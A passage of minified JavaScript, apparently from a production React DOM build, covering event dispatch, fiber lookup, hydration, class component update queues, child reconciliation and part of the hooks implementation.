e;if((m||h)&&(h=c.window===c?c:(h=c.ownerDocument)?h.defaultView||h.parentWindow:window,m?(_=n.relatedTarget||n.toElement,m=u,_=_?Bn(_):null,_!==null&&(w=pr(_),_!==w||_.tag!==5&&_.tag!==6)&&(_=null)):(m=null,_=u),m!==_)){if(v=af,y="onMouseLeave",p="onMouseEnter",f="mouse",(t==="pointerout"||t==="pointerover")&&(v=cf,y="onPointerLeave",p="onPointerEnter",f="pointer"),w=m==null?h:Ar(m),g=_==null?h:Ar(_),h=new v(y,f+"leave",m,n,c),h.target=w,h.relatedTarget=g,y=null,Bn(c)===u&&(v=new v(p,f+"enter",_,n,c),v.target=g,v.relatedTarget=w,y=v),w=y,m&&_)t:{for(v=m,p=_,f=0,g=v;g;g=Er(g))f++;for(g=0,y=p;y;y=Er(y))g++;for(;0<f-g;)v=Er(v),f--;for(;0<g-f;)p=Er(p),g--;for(;f--;){if(v===p||p!==null&&v===p.alternate)break t;v=Er(v),p=Er(p)}v=null}else v=null;m!==null&&Ef(d,h,m,v,!1),_!==null&&w!==null&&Ef(d,w,_,v,!0)}}e:{if(h=u?Ar(u):window,m=h.nodeName&&h.nodeName.toLowerCase(),m==="select"||m==="input"&&h.type==="file")var T=dE;else if(ff(h))if(Sg)T=mE;else{T=fE;var k=hE}else(m=h.nodeName)&&m.toLowerCase()==="input"&&(h.type==="checkbox"||h.type==="radio")&&(T=pE);if(T&&(T=T(t,u))){Cg(d,T,n,c);break e}k&&k(t,h,u),t==="focusout"&&(k=h._wrapperState)&&k.controlled&&h.type==="number"&&Pu(h,"number",h.value)}switch(k=u?Ar(u):window,t){case"focusin":(ff(k)||k.contentEditable==="true")&&(Pr=k,Bu=u,Qi=null);break;case"focusout":Qi=Bu=Pr=null;break;case"mousedown":Hu=!0;break;case"contextmenu":case"mouseup":case"dragend":Hu=!1,vf(d,n,c);break;case"selectionchange":if(vE)break;case"keydown":case"keyup":vf(d,n,c)}var N;if(od)e:{switch(t){case"compositionstart":var x="onCompositionStart";break e;case"compositionend":x="onCompositionEnd";break e;case"compositionupdate":x="onCompositionUpdate";break e}x=void 0}else Nr?wg(t,n)&&(x="onCompositionEnd"):t==="keydown"&&n.keyCode===229&&(x="onCompositionStart");x&&(yg&&n.locale!=="ko"&&(Nr||x!=="onCompositionStart"?x==="onCompositionEnd"&&Nr&&(N=vg()):(cn=c,rd="value"in cn?cn.value:cn.textContent,Nr=!0)),k=Zo(u,x),0<k.length&&(x=new uf(x,t,null,n,c),d.push({event:x,listeners:k}),N?x.data=N:(N=Eg(n),N!==null&&(x.data=N)))),(N=oE?lE(t,n):aE(t,n))&&(u=Zo(u,"onBeforeInput"),0<u.length&&(c=new uf("onBeforeInput","beforeinput",null,n,c),d.push({event:c,listeners:u}),c.data=N))}bg(d,e)})}function gs(t,e,n){return{instance:t,listener:e,currentTarget:n}}function Zo(t,e){for(var n=e+"Capture",r=[];t!==null;){var i=t,s=i.stateNode;i.tag===5&&s!==null&&(i=s,s=us(t,n),s!=null&&r.unshift(gs(t,s,i)),s=us(t,e),s!=null&&r.push(gs(t,s,i))),t=t.return}return r}function Er(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5);return t||null}function Ef(t,e,n,r,i){for(var s=e._reactName,o=[];n!==null&&n!==r;){var l=n,a=l.alternate,u=l.stateNode;if(a!==null&&a===r)break;l.tag===5&&u!==null&&(l=u,i?(a=us(n,s),a!=null&&o.unshift(gs(n,a,l))):i||(a=us(n,s),a!=null&&o.push(gs(n,a,l)))),n=n.return}o.length!==0&&t.push({event:e,listeners:o})}var CE=/\r\n?/g,SE=/\u0000|\uFFFD/g;function Cf(t){return(typeof t=="string"?t:""+t).replace(CE,`
`).replace(SE,"")}function _o(t,e,n){if(e=Cf(e),Cf(t)!==e&&n)throw Error(C(425))}function el(){}var Wu=null,$u=null;function Vu(t,e){return t==="textarea"||t==="noscript"||typeof e.children=="string"||typeof e.children=="number"||typeof e.dangerouslySetInnerHTML=="object"&&e.dangerouslySetInnerHTML!==null&&e.dangerouslySetInnerHTML.__html!=null}var qu=typeof setTimeout=="function"?setTimeout:void 0,TE=typeof clearTimeout=="function"?clearTimeout:void 0,Sf=typeof Promise=="function"?Promise:void 0,IE=typeof queueMicrotask=="function"?queueMicrotask:typeof Sf<"u"?function(t){return Sf.resolve(null).then(t).catch(kE)}:qu;function kE(t){setTimeout(function(){throw t})}function $a(t,e){var n=e,r=0;do{var i=n.nextSibling;if(t.removeChild(n),i&&i.nodeType===8)if(n=i.data,n==="/$"){if(r===0){t.removeChild(i),hs(e);return}r--}else n!=="$"&&n!=="$?"&&n!=="$!"||r++;n=i}while(n);hs(e)}function gn(t){for(;t!=null;t=t.nextSibling){var e=t.nodeType;if(e===1||e===3)break;if(e===8){if(e=t.data,e==="$"||e==="$!"||e==="$?")break;if(e==="/$")return null}}return t}function Tf(t){t=t.previousSibling;for(var e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="$"||n==="$!"||n==="$?"){if(e===0)return t;e--}else n==="/$"&&e++}t=t.previousSibling}return null}var pi=Math.random().toString(36).slice(2),St="__reactFiber$"+pi,_s="__reactProps$"+pi,Ht="__reactContainer$"+pi,Gu="__reactEvents$"+pi,RE="__reactListeners$"+pi,NE="__reactHandles$"+pi;function Bn(t){var e=t[St];if(e)return e;for(var n=t.parentNode;n;){if(e=n[Ht]||n[St]){if(n=e.alternate,e.child!==null||n!==null&&n.child!==null)for(t=Tf(t);t!==null;){if(n=t[St])return n;t=Tf(t)}return e}t=n,n=t.parentNode}return null}function Hs(t){return t=t[St]||t[Ht],!t||t.tag!==5&&t.tag!==6&&t.tag!==13&&t.tag!==3?null:t}function Ar(t){if(t.tag===5||t.tag===6)return t.stateNode;throw Error(C(33))}function Xl(t){return t[_s]||null}var Ku=[],Or=-1;function An(t){return{current:t}}function X(t){0>Or||(t.current=Ku[Or],Ku[Or]=null,Or--)}function K(t,e){Or++,Ku[Or]=t.current,t.current=e}var kn={},xe=An(kn),We=An(!1),Zn=kn;function ei(t,e){var n=t.type.contextTypes;if(!n)return kn;var r=t.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===e)return r.__reactInternalMemoizedMaskedChildContext;var i={},s;for(s in n)i[s]=e[s];return r&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=e,t.__reactInternalMemoizedMaskedChildContext=i),i}function $e(t){return t=t.childContextTypes,t!=null}function tl(){X(We),X(xe)}function If(t,e,n){if(xe.current!==kn)throw Error(C(168));K(xe,e),K(We,n)}function Dg(t,e,n){var r=t.stateNode;if(e=e.childContextTypes,typeof r.getChildContext!="function")return n;r=r.getChildContext();for(var i in r)if(!(i in e))throw Error(C(108,h0(t)||"Unknown",i));return ie({},n,r)}function nl(t){return t=(t=t.stateNode)&&t.__reactInternalMemoizedMergedChildContext||kn,Zn=xe.current,K(xe,t),K(We,We.current),!0}function kf(t,e,n){var r=t.stateNode;if(!r)throw Error(C(169));n?(t=Dg(t,e,Zn),r.__reactInternalMemoizedMergedChildContext=t,X(We),X(xe),K(xe,t)):X(We),K(We,n)}var Ot=null,Jl=!1,Va=!1;function Mg(t){Ot===null?Ot=[t]:Ot.push(t)}function PE(t){Jl=!0,Mg(t)}function On(){if(!Va&&Ot!==null){Va=!0;var t=0,e=$;try{var n=Ot;for($=1;t<n.length;t++){var r=n[t];do r=r(!0);while(r!==null)}Ot=null,Jl=!1}catch(i){throw Ot!==null&&(Ot=Ot.slice(t+1)),lg(Zc,On),i}finally{$=e,Va=!1}}return null}var br=[],Lr=0,rl=null,il=0,tt=[],nt=0,er=null,bt=1,Lt="";function Mn(t,e){br[Lr++]=il,br[Lr++]=rl,rl=t,il=e}function Ug(t,e,n){tt[nt++]=bt,tt[nt++]=Lt,tt[nt++]=er,er=t;var r=bt;t=Lt;var i=32-gt(r)-1;r&=~(1<<i),n+=1;var s=32-gt(e)+i;if(30<s){var o=i-i%5;s=(r&(1<<o)-1).toString(32),r>>=o,i-=o,bt=1<<32-gt(e)+i|n<<i|r,Lt=s+t}else bt=1<<s|n<<i|r,Lt=t}function ad(t){t.return!==null&&(Mn(t,1),Ug(t,1,0))}function ud(t){for(;t===rl;)rl=br[--Lr],br[Lr]=null,il=br[--Lr],br[Lr]=null;for(;t===er;)er=tt[--nt],tt[nt]=null,Lt=tt[--nt],tt[nt]=null,bt=tt[--nt],tt[nt]=null}var Xe=null,Ye=null,te=!1,dt=null;function Fg(t,e){var n=rt(5,null,null,0);n.elementType="DELETED",n.stateNode=e,n.return=t,e=t.deletions,e===null?(t.deletions=[n],t.flags|=16):e.push(n)}function Rf(t,e){switch(t.tag){case 5:var n=t.type;return e=e.nodeType!==1||n.toLowerCase()!==e.nodeName.toLowerCase()?null:e,e!==null?(t.stateNode=e,Xe=t,Ye=gn(e.firstChild),!0):!1;case 6:return e=t.pendingProps===""||e.nodeType!==3?null:e,e!==null?(t.stateNode=e,Xe=t,Ye=null,!0):!1;case 13:return e=e.nodeType!==8?null:e,e!==null?(n=er!==null?{id:bt,overflow:Lt}:null,t.memoizedState={dehydrated:e,treeContext:n,retryLane:1073741824},n=rt(18,null,null,0),n.stateNode=e,n.return=t,t.child=n,Xe=t,Ye=null,!0):!1;default:return!1}}function Yu(t){return(t.mode&1)!==0&&(t.flags&128)===0}function Qu(t){if(te){var e=Ye;if(e){var n=e;if(!Rf(t,e)){if(Yu(t))throw Error(C(418));e=gn(n.nextSibling);var r=Xe;e&&Rf(t,e)?Fg(r,n):(t.flags=t.flags&-4097|2,te=!1,Xe=t)}}else{if(Yu(t))throw Error(C(418));t.flags=t.flags&-4097|2,te=!1,Xe=t}}}function Nf(t){for(t=t.return;t!==null&&t.tag!==5&&t.tag!==3&&t.tag!==13;)t=t.return;Xe=t}function vo(t){if(t!==Xe)return!1;if(!te)return Nf(t),te=!0,!1;var e;if((e=t.tag!==3)&&!(e=t.tag!==5)&&(e=t.type,e=e!=="head"&&e!=="body"&&!Vu(t.type,t.memoizedProps)),e&&(e=Ye)){if(Yu(t))throw jg(),Error(C(418));for(;e;)Fg(t,e),e=gn(e.nextSibling)}if(Nf(t),t.tag===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(C(317));e:{for(t=t.nextSibling,e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="/$"){if(e===0){Ye=gn(t.nextSibling);break e}e--}else n!=="$"&&n!=="$!"&&n!=="$?"||e++}t=t.nextSibling}Ye=null}}else Ye=Xe?gn(t.stateNode.nextSibling):null;return!0}function jg(){for(var t=Ye;t;)t=gn(t.nextSibling)}function ti(){Ye=Xe=null,te=!1}function cd(t){dt===null?dt=[t]:dt.push(t)}var xE=Kt.ReactCurrentBatchConfig;function ut(t,e){if(t&&t.defaultProps){e=ie({},e),t=t.defaultProps;for(var n in t)e[n]===void 0&&(e[n]=t[n]);return e}return e}var sl=An(null),ol=null,Dr=null,dd=null;function hd(){dd=Dr=ol=null}function fd(t){var e=sl.current;X(sl),t._currentValue=e}function Xu(t,e,n){for(;t!==null;){var r=t.alternate;if((t.childLanes&e)!==e?(t.childLanes|=e,r!==null&&(r.childLanes|=e)):r!==null&&(r.childLanes&e)!==e&&(r.childLanes|=e),t===n)break;t=t.return}}function $r(t,e){ol=t,dd=Dr=null,t=t.dependencies,t!==null&&t.firstContext!==null&&(t.lanes&e&&(ze=!0),t.firstContext=null)}function st(t){var e=t._currentValue;if(dd!==t)if(t={context:t,memoizedValue:e,next:null},Dr===null){if(ol===null)throw Error(C(308));Dr=t,ol.dependencies={lanes:0,firstContext:t}}else Dr=Dr.next=t;return e}var Hn=null;function pd(t){Hn===null?Hn=[t]:Hn.push(t)}function zg(t,e,n,r){var i=e.interleaved;return i===null?(n.next=n,pd(e)):(n.next=i.next,i.next=n),e.interleaved=n,Wt(t,r)}function Wt(t,e){t.lanes|=e;var n=t.alternate;for(n!==null&&(n.lanes|=e),n=t,t=t.return;t!==null;)t.childLanes|=e,n=t.alternate,n!==null&&(n.childLanes|=e),n=t,t=t.return;return n.tag===3?n.stateNode:null}var tn=!1;function md(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Bg(t,e){t=t.updateQueue,e.updateQueue===t&&(e.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,effects:t.effects})}function Ft(t,e){return{eventTime:t,lane:e,tag:0,payload:null,callback:null,next:null}}function _n(t,e,n){var r=t.updateQueue;if(r===null)return null;if(r=r.shared,B&2){var i=r.pending;return i===null?e.next=e:(e.next=i.next,i.next=e),r.pending=e,Wt(t,n)}return i=r.interleaved,i===null?(e.next=e,pd(r)):(e.next=i.next,i.next=e),r.interleaved=e,Wt(t,n)}function Lo(t,e,n){if(e=e.updateQueue,e!==null&&(e=e.shared,(n&4194240)!==0)){var r=e.lanes;r&=t.pendingLanes,n|=r,e.lanes=n,ed(t,n)}}function Pf(t,e){var n=t.updateQueue,r=t.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var i=null,s=null;if(n=n.firstBaseUpdate,n!==null){do{var o={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};s===null?i=s=o:s=s.next=o,n=n.next}while(n!==null);s===null?i=s=e:s=s.next=e}else i=s=e;n={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:s,shared:r.shared,effects:r.effects},t.updateQueue=n;return}t=n.lastBaseUpdate,t===null?n.firstBaseUpdate=e:t.next=e,n.lastBaseUpdate=e}function ll(t,e,n,r){var i=t.updateQueue;tn=!1;var s=i.firstBaseUpdate,o=i.lastBaseUpdate,l=i.shared.pending;if(l!==null){i.shared.pending=null;var a=l,u=a.next;a.next=null,o===null?s=u:o.next=u,o=a;var c=t.alternate;c!==null&&(c=c.updateQueue,l=c.lastBaseUpdate,l!==o&&(l===null?c.firstBaseUpdate=u:l.next=u,c.lastBaseUpdate=a))}if(s!==null){var d=i.baseState;o=0,c=u=a=null,l=s;do{var h=l.lane,m=l.eventTime;if((r&h)===h){c!==null&&(c=c.next={eventTime:m,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var _=t,v=l;switch(h=e,m=n,v.tag){case 1:if(_=v.payload,typeof _=="function"){d=_.call(m,d,h);break e}d=_;break e;case 3:_.flags=_.flags&-65537|128;case 0:if(_=v.payload,h=typeof _=="function"?_.call(m,d,h):_,h==null)break e;d=ie({},d,h);break e;case 2:tn=!0}}l.callback!==null&&l.lane!==0&&(t.flags|=64,h=i.effects,h===null?i.effects=[l]:h.push(l))}else m={eventTime:m,lane:h,tag:l.tag,payload:l.payload,callback:l.callback,next:null},c===null?(u=c=m,a=d):c=c.next=m,o|=h;if(l=l.next,l===null){if(l=i.shared.pending,l===null)break;h=l,l=h.next,h.next=null,i.lastBaseUpdate=h,i.shared.pending=null}}while(1);if(c===null&&(a=d),i.baseState=a,i.firstBaseUpdate=u,i.lastBaseUpdate=c,e=i.shared.interleaved,e!==null){i=e;do o|=i.lane,i=i.next;while(i!==e)}else s===null&&(i.shared.lanes=0);nr|=o,t.lanes=o,t.memoizedState=d}}function xf(t,e,n){if(t=e.effects,e.effects=null,t!==null)for(e=0;e<t.length;e++){var r=t[e],i=r.callback;if(i!==null){if(r.callback=null,r=n,typeof i!="function")throw Error(C(191,i));i.call(r)}}}var Hg=new zm.Component().refs;function Ju(t,e,n,r){e=t.memoizedState,n=n(r,e),n=n==null?e:ie({},e,n),t.memoizedState=n,t.lanes===0&&(t.updateQueue.baseState=n)}var Zl={isMounted:function(t){return(t=t._reactInternals)?pr(t)===t:!1},enqueueSetState:function(t,e,n){t=t._reactInternals;var r=Le(),i=yn(t),s=Ft(r,i);s.payload=e,n!=null&&(s.callback=n),e=_n(t,s,i),e!==null&&(_t(e,t,i,r),Lo(e,t,i))},enqueueReplaceState:function(t,e,n){t=t._reactInternals;var r=Le(),i=yn(t),s=Ft(r,i);s.tag=1,s.payload=e,n!=null&&(s.callback=n),e=_n(t,s,i),e!==null&&(_t(e,t,i,r),Lo(e,t,i))},enqueueForceUpdate:function(t,e){t=t._reactInternals;var n=Le(),r=yn(t),i=Ft(n,r);i.tag=2,e!=null&&(i.callback=e),e=_n(t,i,r),e!==null&&(_t(e,t,r,n),Lo(e,t,r))}};function Af(t,e,n,r,i,s,o){return t=t.stateNode,typeof t.shouldComponentUpdate=="function"?t.shouldComponentUpdate(r,s,o):e.prototype&&e.prototype.isPureReactComponent?!ps(n,r)||!ps(i,s):!0}function Wg(t,e,n){var r=!1,i=kn,s=e.contextType;return typeof s=="object"&&s!==null?s=st(s):(i=$e(e)?Zn:xe.current,r=e.contextTypes,s=(r=r!=null)?ei(t,i):kn),e=new e(n,s),t.memoizedState=e.state!==null&&e.state!==void 0?e.state:null,e.updater=Zl,t.stateNode=e,e._reactInternals=t,r&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=i,t.__reactInternalMemoizedMaskedChildContext=s),e}function Of(t,e,n,r){t=e.state,typeof e.componentWillReceiveProps=="function"&&e.componentWillReceiveProps(n,r),typeof e.UNSAFE_componentWillReceiveProps=="function"&&e.UNSAFE_componentWillReceiveProps(n,r),e.state!==t&&Zl.enqueueReplaceState(e,e.state,null)}function Zu(t,e,n,r){var i=t.stateNode;i.props=n,i.state=t.memoizedState,i.refs=Hg,md(t);var s=e.contextType;typeof s=="object"&&s!==null?i.context=st(s):(s=$e(e)?Zn:xe.current,i.context=ei(t,s)),i.state=t.memoizedState,s=e.getDerivedStateFromProps,typeof s=="function"&&(Ju(t,e,s,n),i.state=t.memoizedState),typeof e.getDerivedStateFromProps=="function"||typeof i.getSnapshotBeforeUpdate=="function"||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(e=i.state,typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount(),e!==i.state&&Zl.enqueueReplaceState(i,i.state,null),ll(t,n,i,r),i.state=t.memoizedState),typeof i.componentDidMount=="function"&&(t.flags|=4194308)}function xi(t,e,n){if(t=n.ref,t!==null&&typeof t!="function"&&typeof t!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(C(309));var r=n.stateNode}if(!r)throw Error(C(147,t));var i=r,s=""+t;return e!==null&&e.ref!==null&&typeof e.ref=="function"&&e.ref._stringRef===s?e.ref:(e=function(o){var l=i.refs;l===Hg&&(l=i.refs={}),o===null?delete l[s]:l[s]=o},e._stringRef=s,e)}if(typeof t!="string")throw Error(C(284));if(!n._owner)throw Error(C(290,t))}return t}function yo(t,e){throw t=Object.prototype.toString.call(e),Error(C(31,t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t))}function bf(t){var e=t._init;return e(t._payload)}function $g(t){function e(p,f){if(t){var g=p.deletions;g===null?(p.deletions=[f],p.flags|=16):g.push(f)}}function n(p,f){if(!t)return null;for(;f!==null;)e(p,f),f=f.sibling;return null}function r(p,f){for(p=new Map;f!==null;)f.key!==null?p.set(f.key,f):p.set(f.index,f),f=f.sibling;return p}function i(p,f){return p=wn(p,f),p.index=0,p.sibling=null,p}function s(p,f,g){return p.index=g,t?(g=p.alternate,g!==null?(g=g.index,g<f?(p.flags|=2,f):g):(p.flags|=2,f)):(p.flags|=1048576,f)}function o(p){return t&&p.alternate===null&&(p.flags|=2),p}function l(p,f,g,y){return f===null||f.tag!==6?(f=Ja(g,p.mode,y),f.return=p,f):(f=i(f,g),f.return=p,f)}function a(p,f,g,y){var T=g.type;return T===Rr?c(p,f,g.props.children,y,g.key):f!==null&&(f.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===en&&bf(T)===f.type)?(y=i(f,g.props),y.ref=xi(p,f,g),y.return=p,y):(y=zo(g.type,g.key,g.props,null,p.mode,y),y.ref=xi(p,f,g),y.return=p,y)}function u(p,f,g,y){return f===null||f.tag!==4||f.stateNode.containerInfo!==g.containerInfo||f.stateNode.implementation!==g.implementation?(f=Za(g,p.mode,y),f.return=p,f):(f=i(f,g.children||[]),f.return=p,f)}function c(p,f,g,y,T){return f===null||f.tag!==7?(f=Kn(g,p.mode,y,T),f.return=p,f):(f=i(f,g),f.return=p,f)}function d(p,f,g){if(typeof f=="string"&&f!==""||typeof f=="number")return f=Ja(""+f,p.mode,g),f.return=p,f;if(typeof f=="object"&&f!==null){switch(f.$$typeof){case lo:return g=zo(f.type,f.key,f.props,null,p.mode,g),g.ref=xi(p,null,f),g.return=p,g;case kr:return f=Za(f,p.mode,g),f.return=p,f;case en:var y=f._init;return d(p,y(f._payload),g)}if(Bi(f)||Ii(f))return f=Kn(f,p.mode,g,null),f.return=p,f;yo(p,f)}return null}function h(p,f,g,y){var T=f!==null?f.key:null;if(typeof g=="string"&&g!==""||typeof g=="number")return T!==null?null:l(p,f,""+g,y);if(typeof g=="object"&&g!==null){switch(g.$$typeof){case lo:return g.key===T?a(p,f,g,y):null;case kr:return g.key===T?u(p,f,g,y):null;case en:return T=g._init,h(p,f,T(g._payload),y)}if(Bi(g)||Ii(g))return T!==null?null:c(p,f,g,y,null);yo(p,g)}return null}function m(p,f,g,y,T){if(typeof y=="string"&&y!==""||typeof y=="number")return p=p.get(g)||null,l(f,p,""+y,T);if(typeof y=="object"&&y!==null){switch(y.$$typeof){case lo:return p=p.get(y.key===null?g:y.key)||null,a(f,p,y,T);case kr:return p=p.get(y.key===null?g:y.key)||null,u(f,p,y,T);case en:var k=y._init;return m(p,f,g,k(y._payload),T)}if(Bi(y)||Ii(y))return p=p.get(g)||null,c(f,p,y,T,null);yo(f,y)}return null}function _(p,f,g,y){for(var T=null,k=null,N=f,x=f=0,W=null;N!==null&&x<g.length;x++){N.index>x?(W=N,N=null):W=N.sibling;var F=h(p,N,g[x],y);if(F===null){N===null&&(N=W);break}t&&N&&F.alternate===null&&e(p,N),f=s(F,f,x),k===null?T=F:k.sibling=F,k=F,N=W}if(x===g.length)return n(p,N),te&&Mn(p,x),T;if(N===null){for(;x<g.length;x++)N=d(p,g[x],y),N!==null&&(f=s(N,f,x),k===null?T=N:k.sibling=N,k=N);return te&&Mn(p,x),T}for(N=r(p,N);x<g.length;x++)W=m(N,p,x,g[x],y),W!==null&&(t&&W.alternate!==null&&N.delete(W.key===null?x:W.key),f=s(W,f,x),k===null?T=W:k.sibling=W,k=W);return t&&N.forEach(function(lt){return e(p,lt)}),te&&Mn(p,x),T}function v(p,f,g,y){var T=Ii(g);if(typeof T!="function")throw Error(C(150));if(g=T.call(g),g==null)throw Error(C(151));for(var k=T=null,N=f,x=f=0,W=null,F=g.next();N!==null&&!F.done;x++,F=g.next()){N.index>x?(W=N,N=null):W=N.sibling;var lt=h(p,N,F.value,y);if(lt===null){N===null&&(N=W);break}t&&N&&lt.alternate===null&&e(p,N),f=s(lt,f,x),k===null?T=lt:k.sibling=lt,k=lt,N=W}if(F.done)return n(p,N),te&&Mn(p,x),T;if(N===null){for(;!F.done;x++,F=g.next())F=d(p,F.value,y),F!==null&&(f=s(F,f,x),k===null?T=F:k.sibling=F,k=F);return te&&Mn(p,x),T}for(N=r(p,N);!F.done;x++,F=g.next())F=m(N,p,x,F.value,y),F!==null&&(t&&F.alternate!==null&&N.delete(F.key===null?x:F.key),f=s(F,f,x),k===null?T=F:k.sibling=F,k=F);return t&&N.forEach(function(Si){return e(p,Si)}),te&&Mn(p,x),T}function w(p,f,g,y){if(typeof g=="object"&&g!==null&&g.type===Rr&&g.key===null&&(g=g.props.children),typeof g=="object"&&g!==null){switch(g.$$typeof){case lo:e:{for(var T=g.key,k=f;k!==null;){if(k.key===T){if(T=g.type,T===Rr){if(k.tag===7){n(p,k.sibling),f=i(k,g.props.children),f.return=p,p=f;break e}}else if(k.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===en&&bf(T)===k.type){n(p,k.sibling),f=i(k,g.props),f.ref=xi(p,k,g),f.return=p,p=f;break e}n(p,k);break}else e(p,k);k=k.sibling}g.type===Rr?(f=Kn(g.props.children,p.mode,y,g.key),f.return=p,p=f):(y=zo(g.type,g.key,g.props,null,p.mode,y),y.ref=xi(p,f,g),y.return=p,p=y)}return o(p);case kr:e:{for(k=g.key;f!==null;){if(f.key===k)if(f.tag===4&&f.stateNode.containerInfo===g.containerInfo&&f.stateNode.implementation===g.implementation){n(p,f.sibling),f=i(f,g.children||[]),f.return=p,p=f;break e}else{n(p,f);break}else e(p,f);f=f.sibling}f=Za(g,p.mode,y),f.return=p,p=f}return o(p);case en:return k=g._init,w(p,f,k(g._payload),y)}if(Bi(g))return _(p,f,g,y);if(Ii(g))return v(p,f,g,y);yo(p,g)}return typeof g=="string"&&g!==""||typeof g=="number"?(g=""+g,f!==null&&f.tag===6?(n(p,f.sibling),f=i(f,g),f.return=p,p=f):(n(p,f),f=Ja(g,p.mode,y),f.return=p,p=f),o(p)):n(p,f)}return w}var ni=$g(!0),Vg=$g(!1),Ws={},kt=An(Ws),vs=An(Ws),ys=An(Ws);function Wn(t){if(t===Ws)throw Error(C(174));return t}function gd(t,e){switch(K(ys,e),K(vs,t),K(kt,Ws),t=e.nodeType,t){case 9:case 11:e=(e=e.documentElement)?e.namespaceURI:Au(null,"");break;default:t=t===8?e.parentNode:e,e=t.namespaceURI||null,t=t.tagName,e=Au(e,t)}X(kt),K(kt,e)}function ri(){X(kt),X(vs),X(ys)}function qg(t){Wn(ys.current);var e=Wn(kt.current),n=Au(e,t.type);e!==n&&(K(vs,t),K(kt,n))}function _d(t){vs.current===t&&(X(kt),X(vs))}var ne=An(0);function al(t){for(var e=t;e!==null;){if(e.tag===13){var n=e.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return e}else if(e.tag===19&&e.memoizedProps.revealOrder!==void 0){if(e.flags&128)return e}else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}return null}var qa=[];function vd(){for(var t=0;t<qa.length;t++)qa[t]._workInProgressVersionPrimary=null;qa.length=0}var Do=Kt.ReactCurrentDispatcher,Ga=Kt.ReactCurrentBatchConfig,tr=0,re=null,he=null,_e=null,ul=!1,Xi=!1,ws=0,AE=0;function ke(){throw Error(C(321))}function yd(t,e){if(e===null)return!1;for(var n=0;n<e.length&&n<t.length;n++)if(!yt(t[n],e[n]))return!1;return!0}function wd(t,e,n,r,i,s){if(tr=s,re=e,e.memoizedState=null,e.updateQueue=null,e.lanes=0,Do.current=t===null||t.memoizedState===null?DE:ME,t=n(r,i),Xi){s=0;do{if(Xi=!1,ws=0,25<=s)throw Error(C(301));s+=1,_e=he=null,e.updateQueue=null,Do.current=UE,t=n(r,i)}while(Xi)}if(Do.current=cl,e=he!==null&&he.next!==null,tr=0,_e=he=re=null,ul=!1,e)throw Error(C(300));return t}function Ed(){var t=ws!==0;return ws=0,t}function Ct(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return _e===null?re.memoizedState=_e=t:_e=_e.next=t,_e}function ot(){if(he===null){var t=re.alternate;t=t!==null?t.memoizedState:null}else t=he.next;var e=_e===null?re.memoizedState:_e.next;if(e!==null)_e=e,he=t;else{if(t===null)throw Error(C(310));he=t,t={memoizedState:he.memoizedState,baseState:he.baseState,baseQueue:he.baseQueue,queue:he.queue,next:null},_e===null?re.memoizedState=_e=t:_e=_e.next=t}return _e}function Es(t,e){return typeof e=="function"?e(t):e}function Ka(t){var e=ot(),n=e.queue;if(n===null)throw Error(C(311));n.lastRenderedReducer=t;var r=he,i=r.baseQueue,s=n.pending;if(s!==null){if(i!==null){var o=i.next;i.next=s.next,s.next=o}r.baseQueue=i=s,n.pending=null}if(i!==null){s=i.next,r=r.baseState;var l=o=null,a=null,u=s;do{var c=u.lane;if((tr&c)===c)a!==null&&(a=a.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),r=u.hasEagerState?u.eagerState:t(r,u.action);else{var d={lane:c,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};a===null?(l=a=d,o=r):a=a.next=d,re.lanes|=c,nr|=c}u=u.next}while(u!==null&&u!==s);a===null?o=r:a.next=l,yt(r,e.memoizedState)||(ze=!0),e.memoizedState=r,e.baseState=o,e.baseQueue=a,n.lastRenderedState=r}if(t=n.interleaved,t!==null){i=t;do s=i.lane,re.lanes|=s,nr|=s,i=i.next;while(i!==t)}else i===null&&(n.lanes=0);return[e.memoizedState,n.dispatch]}function Ya(t){var e=ot(),n=e.queue;if(n===null)throw Error(C(311));n.lastRenderedReducer=t;var r=n.dispatch,i=n.pending,s=e.memoizedState;if(i!==null){n.pending=null;var o=i=i.next;do s=t(s,o.action),o=o.next;while(o!==i);yt(s,e.memoizedState)||(ze=!0),e.memoizedState=s,e.baseQueue===null&&(e.baseState=s),n.lastRenderedState=s}return[s,r]}function Gg(){}function Kg(t,e){var n=re,r=ot(),i=e(),s=!yt(r.memoizedState,i);if(s&&(r.memoizedState=i,ze=!0),r=r.queue,Cd(Xg.bind(null,n,r,t),[t]),r.getSnapshot!==e||s||_e!==null&&_e.memoizedState.tag&1){if(n.flags|=2048,Cs(9,Qg.bind(null,n,r,i,e),void 0,null),we===null)throw Error(C(349));tr&30||Yg(n,e,i)}return i}function Yg(t,e,n){t.flags|=16384,t={getSnapshot:e,value:n},e=re.updateQueue,e===null?(e={lastEffect:null,stores:null},re.updateQueue=e,e.stores=[t]):(n=e.stores,n===null?e.stores=[t]:n.push(t))}function 